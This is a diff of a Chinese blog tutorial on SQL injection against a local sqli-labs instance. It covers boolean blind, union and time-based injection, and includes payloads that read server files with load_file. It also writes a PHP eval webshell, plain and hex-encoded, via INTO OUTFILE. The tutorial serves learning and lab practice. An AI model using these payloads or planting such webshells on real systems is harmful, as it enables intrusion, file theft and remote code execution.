+<h5 id="24-version-compile-os-返回操作系统版本"><a href="#24-version-compile-os-返回操作系统版本" class="headerlink" title="24  @@version_compile_os 返回操作系统版本"></a>24  @@version_compile_os 返回操作系统版本</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566518753877.png" alt="1566518753877"></p>
+<h1 id="Mysql通过system命令调用系统shell命令"><a href="#Mysql通过system命令调用系统shell命令" class="headerlink" title="Mysql通过system命令调用系统shell命令"></a>Mysql通过system命令调用系统shell命令</h1><p><img src="/2019/08/22/数据库系统功能相关学习/1566822624149.png" alt="1566822624149"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566823276097.png" alt="1566823276097"></p>
 <h1 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h1><h2 id="1-Boolean盲注"><a href="#1-Boolean盲注" class="headerlink" title="1 Boolean盲注"></a>1 Boolean盲注</h2><p>盲注，就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的信息，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到了执行。</p>
 <p>通过输入<a href="http://127.0.0.1/sqli/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=1</a> 得到以下界面</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566826287378.png" alt="1566826287378"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566826287378.png" alt="1566826287378"></p>
 <p>然后输入 <a href="http://127.0.0.1/sqli/Less-5/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=-1</a>   我们得到下面的页面</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566826311109.png" alt="1566826311109"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566826311109.png" alt="1566826311109"></p>
 <p>当我们输入  <a href="http://127.0.0.1/sqli/Less-5/?id=1'" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1</a>‘  我们得到下面的页面</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566826337973.png" alt="1566826337973"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566826337973.png" alt="1566826337973"></p>
 <p>当输入正确时显示 You are in…</p>
 <p>当我们显示语句错误时，就不显示任何数据</p>
 <p>当我们的语法有错误时，就报出SQL语句错误</p>
@@ -991,50 +984,50 @@
 <p>判断数据类型：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">判断是否是 Mysql数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from information_schema.tables) --+</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566826983359.png" alt="1566826983359"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566826983359.png" alt="1566826983359"></p>
 <p>2 判断当前数据库名</p>
 <p>1：判断当前数据库的长度，利用二分法<br><a href="http://127.0.0.1/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1&#39;</a> and length(database())&gt;5  –+ //正常显示<br><a href="http://127.0.0.1/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1&#39;</a> and length(database())&gt;10  –+ //不显示任何数据<br><a href="http://127.0.0.1/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1&#39;</a> and length(database())&gt;7   –+//正常显示<br><a href="http://127.0.0.1/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=1&#39;</a> and length(database())&gt;8   –+//不显示任何数据<br>``</p>
 <p>大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为 8</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line">判断数据库的第一个字符 大于114 不大于115 第一个字符是S 依次类推</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566827374119.png" alt="1566827374119"></p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566827394929.png" alt="1566827394929"></p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566827407969.png" alt="1566827407969"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566827374119.png" alt="1566827374119"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566827394929.png" alt="1566827394929"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566827407969.png" alt="1566827407969"></p>
 <h2 id="2-union-注入"><a href="#2-union-注入" class="headerlink" title="2 union 注入"></a>2 union 注入</h2><p>union 联合查询适用于有显示列的注入；</p>
 <p> 通过order by来判断当前表的列数。得知表有 3列</p>
 <p>“SELECT * FROM users WHERE id=’1’ order by 3 –+ ’’ LIMIT 0,1”</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566827878715.png" alt="1566827878715"></p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566827864811.png" alt="1566827864811"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566827878715.png" alt="1566827878715"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566827864811.png" alt="1566827864811"></p>
 <p>直接把前面 id=1 改成 id =-1  执行后面的语句</p>
 <p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,3 –+</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566828117199.png" alt="1566828117199"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566828117199.png" alt="1566828117199"></p>
 <p>由上图可知，第二和第三个位置显示列信息</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566828474946.png" alt="1566828474946"></p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566828626248.png" alt="1566828626248"></p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566828638674.png" alt="1566828638674"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566828474946.png" alt="1566828474946"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566828626248.png" alt="1566828626248"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566828638674.png" alt="1566828638674"></p>
 <h3 id="2-1文件读写"><a href="#2-1文件读写" class="headerlink" title="2.1文件读写"></a>2.1文件读写</h3><p>有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取；</p>
 <p>文件写入只能利用 union 注入</p>
 <p>union注入读取文件</p>
 <p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a>   union select 1,2,load_file(“e:/read.txt”) –+</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566828896741.png" alt="1566828896741"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566828896741.png" alt="1566828896741"></p>
 <p>把 e:/read.txt 转换成16进制 0x653a2f332e747874</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566829227699.png" alt="1566829227699"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566829227699.png" alt="1566829227699"></p>
 <p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a>   union select 1,2,load_file(0x653a2f726561642e747874) –+</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566829485987.png" alt="1566829485987"></p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566829535539.png" alt="1566829535539"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566829485987.png" alt="1566829485987"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566829535539.png" alt="1566829535539"></p>
 <p>union写入文件</p>
 <p>利用union注入写入一句话木马  into outfile 和 into dumpfile 都可以</p>
 <p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a>  union select 1,2,’<?php @eval($_POST[aaa]);?>‘  into outfile  ‘e:/4.php’ –+</p>
 <p> 可以将一句话木马转换成16进制的形式</p>
 <p> <a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a>  union select 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e  into outfile  ‘e:/44.php’ –+</p>
 <p>E 盘下：</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566829780405.png" alt="1566829780405"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566829780405.png" alt="1566829780405"></p>
 <h2 id="3-sleep延时注入"><a href="#3-sleep延时注入" class="headerlink" title="3 sleep延时注入"></a>3 sleep延时注入</h2><p><strong>利用前提：</strong>页面上没有显示位，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，但是加入 sleep(5)条件之后，页面的返回速度明显慢了 5 秒。</p>
 <p><strong>优点：</strong>不需要显示位，不需要出错信息。<br><strong>缺点：</strong>速度慢，耗费大量时间</p>
 <p>sleep 函数判断页面响应时间               if(判断条件，为true时执行，为false时执行)</p>
 <p>我们可以构造下面的语句，判断条件是否成立。然后不断变换函数直到获取到我们想要的信息</p>
 <p>//判断是否存在延时注入<br><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> and sleep(5) –+  //页面延时5秒响应</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566831760128.png" alt="1566831760128"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566831760128.png" alt="1566831760128"></p>
 <p>// 判断数据库的第一个字符的ascii值是否大于100，如果大于100，页面立即响应，如果不大于，页面延时5秒响应<br><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5)) –+</p>
 <p><img src="/2019/08/22/数据库系统功能相关学习/1566861605141.png" alt="1566861605141"></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.runoob.com/mysql/mysql-functions.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-functions.html</a></p>
